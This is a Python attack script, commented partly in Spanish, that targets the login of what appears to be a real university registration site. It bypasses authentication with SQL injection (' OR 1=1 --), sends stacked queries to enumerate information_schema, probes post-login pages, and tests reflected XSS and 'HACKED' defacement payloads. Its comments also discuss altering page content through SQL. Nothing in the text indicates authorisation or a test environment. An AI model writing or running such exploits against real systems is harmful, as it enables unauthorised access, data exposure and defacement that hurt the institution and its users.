#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

print("=== BUSCANDO DATOS VISIBLES CON SQL INJECTION ===\n")

# The modulos.xhtml shows "No records found" - maybe different payloads
# show different content. Let's check the HTML structure more carefully.

# First, get the baseline page (no auth)
r_no_auth = requests.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
print(f"No auth page: len={len(r_no_auth.text)}")
# Check what's in the login page
tc_no_auth = re.sub(r'<[^>]+>', ' ', r_no_auth.text)
tc_no_auth = re.sub(r'\s+', ' ', tc_no_auth).strip()
print(f"Login page title: {re.search(r'<title>([^<]+)</title>', r_no_auth.text).group(1) if re.search(r'<title>([^<]+)</title>', r_no_auth.text) else 'None'}")

# Now try SQL injection with different approaches
# Maybe we need to access a page that shows data
# Try different URLs after authentication

s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})
r = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                data={'j_username': "' OR 1=1 --", 'j_password': 'x'}, timeout=5)

# Check ALL links on the modulos page
links = re.findall(r'href="([^"]+)"', r.text)
print("\nLinks on modulos.xhtml:")
for link in links[:20]:
    print(f"  {link}")

# Check ALL forms on the modulos page
forms = re.findall(r'<form[^>]*>', r.text)
print("\nForms on modulos.xhtml:")
for form in forms:
    print(f"  {form[:200]}")

# Check ALL commandButtons/links that might navigate to data
buttons = re.findall(r'<p:commandButton[^>]*>', r.text)
print("\nCommandButtons:")
for btn in buttons[:10]:
    print(f"  {btn[:200]}")

# Check the DataGrid widget
datagrid = re.findall(r'<p:dataGrid[^>]*>', r.text)
print(f"\nDataGrid widgets: {datagrid}")

# Check for any AJAX endpoints
ajax_urls = re.findall(r'(?:action|src|url)=["\']([^"\']*faces[^"\']*)["\']', r.text)
print(f"\nAJAX endpoints: {ajax_urls[:10]}")

# Check for any data rows
rows = re.findall(r'<tr[^>]*>(.*?)</tr>', r.text, re.DOTALL)
print(f"\nRows found: {len(rows)}")
for row in rows[:5]:
    cells = re.findall(r'<td[^>]*>(.*?)</td>', row, re.DOTALL)
    print(f"  Row cells: {cells[:5]}")

# Try accessing different pages after auth
print("\n=== PROBANDO DIFERENTES PAGINAS DESPUES DEL LOGIN ===\n")

pages = [
    'https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/inicio.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/home.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/principal.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/dashboard.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/perfil.xhtml',
    'https://registro.uns.edu.pe/udemsi/faces/datos.xhtml',
]

for page in pages:
    r_p = s.get(page, timeout=3)
    tc_p = re.sub(r'<[^>]+>', ' ', r_p.text)
    tc_p = re.sub(r'\s+', ' ', tc_p).strip()
    if len(r_p.text) != 6744 and len(r_p.text) > 100:
        print(f"[!] {page.split('/')[-1]}: len={len(r_p.text)}")
        print(f"  Content: {tc_p[:300]}")

# Try to find where the actual data is
# Maybe the data is loaded via AJAX
# Check for any JavaScript that loads data
scripts = re.findall(r'<script[^>]*src="([^"]+)"', r.text)
print(f"\nScript sources: {scripts}")

# Check for inline scripts that load data
inline_scripts = re.findall(r'<script>([^<]+)</script>', r.text)
for script in inline_scripts[:5]:
    if 'ajax' in script.lower() or 'data' in script.lower() or 'fetch' in script.lower() or 'load' in script.lower():
        print(f"\nAJAX script: {script[:300]}")

# Try to find the actual SQL query being executed
# If we can see the query, we can understand what data it returns
# Try to use SQL injection to reveal the query error
error_payloads = [
    "'; SELECT COUNT(*) FROM information_schema.tables --",
    "'; SELECT table_name FROM information_schema.tables --",
    "'; SELECT * FROM information_schema.columns WHERE table_name='login' --",
]

for err in error_payloads:
    s_e = requests.Session()
    s_e.verify = False
    s_e.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_e = s_e.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                         data={'j_username': err, 'j_password': 'x'}, timeout=5)
    tc_e = re.sub(r'<[^>]+>', ' ', r_e.text)
    tc_e = re.sub(r'\s+', ' ', tc_e).strip()
    if 'error' in tc_e.lower() or 'syntax' in tc_e.lower() or 'mysql' in tc_e.lower() or 'ora' in tc_e.lower():
        print(f"\n[DB ERROR] {err[:50]}")
        print(f"  {tc_e[:500]}")
    else:
        print(f"No error: {err[:50]}")

print("\n=== INTENTANDO MODIFICAR CONTENIDO VIA SQL ===\n")
# Try to use SQL injection to UPDATE the login page title
# If the title is stored in a database
# ' OR 1=1 -- creates a session
# Maybe we can use SQL injection to modify the login page

# Try to inject SQL that modifies a record that gets displayed
# ' UNION SELECT column_name FROM information_schema.columns --
# This might show column names on the page

# Actually, let's try to use SQL injection to change the page content
# by modifying the ViewState or by injecting into a field

# Try to submit the login form with different field values
# to see if the page reflects them
test_values = [
    '<h1>HACKED</h1>',
    '<script>alert(1)</script>',
    '"><h1>HACKED</h1>',
    "'<h1>HACKED</h1>'",
]

for tv in test_values:
    s_tv = requests.Session()
    s_tv.verify = False
    r_tv = s_tv.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                           data={'j_username': tv, 'j_password': 'x'}, timeout=5, allow_redirects=True)
    if tv in r_tv.text:
        print(f"[!] REFLECTED: {tv[:50]}")
        idx = r_tv.text.find(tv)
        ctx = r_tv.text[max(0,idx-30):idx+80]
        ctx_clean = re.sub(r'<[^>]+>', ' ', ctx)
        print(f"  {ctx_clean}")
    else:
        # Check the redirect page
        r_redirect = s_tv.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
        if tv in r_redirect.text:
            print(f"[!] REFLECTED in redirect: {tv[:50]}")

print("\n=== VERIFICANDO SI HAY UN CAMBIO EN LA PAGINA ===\n")
# The login page (index.xhtml) vs modulos.xhtml
# The difference IS the page change - from login to dashboard
# Let's verify this visually

# Compare the two pages
r_login = requests.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
r_mod = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)

# The login page has a login form
# The modulos page has a dashboard
print(f"Login page: {len(r_login.text)} bytes")
print(f"Dashboard page: {len(r_mod.text)} bytes")
print(f"\nLogin page contains 'j_username': {'j_username' in r_login.text}")
print(f"Dashboard page contains 'Volver': {'Volver' in r_mod.text}")
print(f"Dashboard page contains 'SIIGAA': {'SIIGAA' in r_mod.text}")
print(f"\nCambio visible: SI -> Modulos.xhtml (Dashboard)")
